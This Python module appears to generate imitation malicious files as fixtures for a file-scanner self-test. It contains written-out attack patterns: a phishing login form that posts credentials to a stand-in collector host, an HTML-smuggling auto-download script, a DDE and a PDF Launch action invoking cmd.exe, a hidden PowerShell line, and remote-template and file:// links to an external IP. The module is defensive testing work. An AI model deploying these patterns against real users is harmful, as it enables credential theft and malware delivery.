"""
Small sample files for the owner's live file test (/api/selftest/files). They are built in
memory: harmless imitations of the tricks real scam files use (nothing here can run).
"""
import io
import struct
import zipfile
import zlib

EICAR = b"X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*"


def zip_of(files: dict, password_flag: bool = False) -> bytes:
    b = io.BytesIO()
    with zipfile.ZipFile(b, "w", zipfile.ZIP_DEFLATED) as z:
        for n, d in files.items():
            z.writestr(n, d)
    data = bytearray(b.getvalue())
    if password_flag:   # mark entries as encrypted, like a password-protected ZIP
        for sig, off in ((b"PK\x03\x04", 6), (b"PK\x01\x02", 8)):
            i = 0
            while (i := data.find(sig, i)) >= 0:
                data[i + off] |= 1
                i += 4
    return bytes(data)


def png() -> bytes:
    def chunk(t, d):
        return struct.pack(">I", len(d)) + t + d + struct.pack(">I", zlib.crc32(t + d) & 0xFFFFFFFF)
    raw = b"".join(b"\x00" + b"\x40\x80\x40" * 8 for _ in range(8))
    return b"\x89PNG\r\n\x1a\n" + chunk(b"IHDR", struct.pack(">IIBBBBB", 8, 8, 8, 2, 0, 0, 0)) + \
        chunk(b"IDAT", zlib.compress(raw)) + chunk(b"IEND", b"")


def pdf(body: bytes = b"") -> bytes:
    return b"%PDF-1.4\n1 0 obj<</Type/Catalog/Pages 2 0 R" + body + b">>endobj\n2 0 obj<</Type/Pages/Kids[]/Count 0>>endobj\n%%EOF"


def office(kind: str, extra: dict = None, rels: str = "") -> bytes:
    main = {"word": "word/document.xml", "xl": "xl/workbook.xml", "ppt": "ppt/presentation.xml"}[kind]
    files = {"[Content_Types].xml": "<Types/>", main: "<doc><p>Quarterly report</p></doc>",
             f"{kind}/_rels/{main.split('/')[1]}.rels": f"<Relationships>{rels}</Relationships>"}
    files.update(extra or {})
    return zip_of(files)


def fake_apk(package: str, permissions) -> bytes:
    """A tiny APK whose binary manifest lists the given package and permissions (it has no code)."""
    strs = ["manifest", "package", package] + list(permissions)
    enc = b"".join(struct.pack("<H", len(x)) + x.encode("utf-16-le") + b"\0\0" for x in strs)
    offs, o = [], 0
    for x in strs:
        offs.append(o)
        o += 2 + len(x) * 2 + 2
    hdr = 28
    pool = struct.pack("<IIIII", len(strs), 0, 0, hdr + 4 * len(strs), 0)
    body = struct.pack(f"<{len(strs)}I", *offs) + enc
    body += b"\0" * (-len(body) % 4)
    sp = struct.pack("<HHI", 0x0001, hdr, hdr + len(body)) + pool + body
    attr = struct.pack("<IIIHBBI", 0xFFFFFFFF, 1, 2, 8, 0, 3, 2)
    el = struct.pack("<HHIII", 0x0102, 16, 36 + len(attr), 0, 0xFFFFFFFF) + \
        struct.pack("<IIHHHHHH", 0xFFFFFFFF, 0, 20, 20, 1, 0, 0, 0) + attr
    axml = struct.pack("<HHI", 0x0003, 8, 8 + len(sp) + len(el)) + sp + el
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w") as z:
        z.writestr("AndroidManifest.xml", axml)
        z.writestr("classes.dex", b"dex\n035")
    return buf.getvalue()


SMS = "android.permission.RECEIVE_SMS"
ACCESS = "android.permission.BIND_ACCESSIBILITY_SERVICE"
MZ = b"MZ" + b"\x00" * 200
ISO = b"\x00" * 0x8001 + b"CD001" + b"\x00" * 64
PHISH_HTML = b"""<html><head><title>Microsoft Outlook - Sign in</title></head><body>
<form action="https://evil-collector-sample.top/post.php" method="post"><input type="email" name="u" value="ravi@company.in">
<input type="password" name="p"><button>View Document</button></form></body></html>"""
SMUGGLE_HTML = b"""<html><body><script>var b=atob("TVqQAAMAAAAEAAAA");var blob=new Blob([b]);
var a=document.createElement('a');a.href=URL.createObjectURL(blob);a.download='Invoice.iso';a.click();</script></body></html>"""

SAFE, CAUTION, DANGEROUS, NOT_SAFE = "SAFE", "CAUTION", "DANGEROUS", "NOT_SAFE"


def file_sets():
    return {
        "1": ("Genuine files (should all be SAFE)", [
            ("photo.png", png(), SAFE), ("bill.pdf", pdf(), SAFE), ("report.docx", office("word"), SAFE),
            ("budget.xlsx", office("xl"), SAFE), ("photos.zip", zip_of({"a.png": png(), "b.png": png()}), SAFE),
            ("notes.txt", b"Meeting at 5 pm. Bring the bank statement.", SAFE),
        ]),
        "2": ("Programs disguised as documents or photos", [
            ("invoice.pdf.exe", MZ, DANGEROUS), ("photo.jpg", MZ, DANGEROUS), ("Invoice\u202efdp.exe", MZ, DANGEROUS),
            ("Wedding Card.pdf", fake_apk("com.wedding.card", [SMS]), DANGEROUS),
            ("readme.txt", b"@echo off\npowershell -w hidden", DANGEROUS), ("Invoice.pdf", ISO, DANGEROUS),
        ]),
        "3": ("Fake bank and government apps, and archives hiding programs", [
            ("RTO_Challan.apk", fake_apk("com.rto.challan", [SMS, ACCESS]), DANGEROUS),
            ("SBI_YONO.xapk", zip_of({"com.sbi.yono.apk": fake_apk("com.sbi.yono", [SMS]), "manifest.json": "{}"}), DANGEROUS),
            ("docs.zip", zip_of({"Invoice.pdf.exe": MZ}), DANGEROUS),
            ("secret.zip", zip_of({"Invoice.pdf.exe": MZ}, password_flag=True), DANGEROUS),
            ("nested.zip", zip_of({"inner.zip": zip_of({"payload.exe": MZ})}), NOT_SAFE),
            ("game.apk", fake_apk("com.fun.game", ["android.permission.INTERNET"]), CAUTION),
        ]),
        "4": ("Documents with hidden tricks", [
            ("macro.docx", office("word", {"word/vbaProject.bin": b"\xd0\xcf\x11\xe0"}), DANGEROUS),
            ("template.docx", office("word", rels='<Relationship Id="r1" Type="http://schemas.openxmlformats.org/officeDocument/2006/'
                                     'relationships/attachedTemplate" Target="http://203.0.113.9/t.dotm" TargetMode="External"/>'), NOT_SAFE),
            ("dde.docx", office("word", {"word/document.xml": "<doc><fld instr=' DDEAUTO c:\\\\windows\\\\system32\\\\cmd.exe'/></doc>"}), NOT_SAFE),
            ("ole.docx", office("word", {"word/embeddings/oleObject1.bin": b"\xd0\xcf\x11\xe0Package\x00payload.exe"}), NOT_SAFE),
            ("js.pdf", pdf(b"/OpenAction<</S/J#61vaScript/JS(app.alert(1))>>"), NOT_SAFE),
            ("launch.pdf", pdf(b"/OpenAction<</S/Launch/F(cmd.exe)>>"), DANGEROUS),
        ]),
        "5": ("Fake login pages and web files sent as attachments", [
            ("Payment_Receipt.html", PHISH_HTML, DANGEROUS), ("Invoice.html", SMUGGLE_HTML, DANGEROUS),
            ("open.htm", b'<html><head><meta http-equiv="refresh" content="0;url=https://sbi-kyc-update-2026.xyz/login"></head></html>', NOT_SAFE),
            ("logo.svg", b"<svg xmlns='http://www.w3.org/2000/svg'><script>window.location='https://example.com/'</script></svg>", NOT_SAFE),
            ("notes.one", b"\xe4\x52\x5c\x7b\x8c\xd8\xa7\x4d" + b"\x00" * 64 + b"Open.hta", DANGEROUS),
            ("page.url", b"[InternetShortcut]\nURL=file://203.0.113.9/share/x.exe", DANGEROUS),
        ]),
        "6": ("Known virus samples, checked by fingerprint on VirusTotal and MalwareBazaar", [
            ("eicar.com", EICAR, DANGEROUS), ("eicar.zip", zip_of({"eicar.com": EICAR}), DANGEROUS),
        ]),
    }
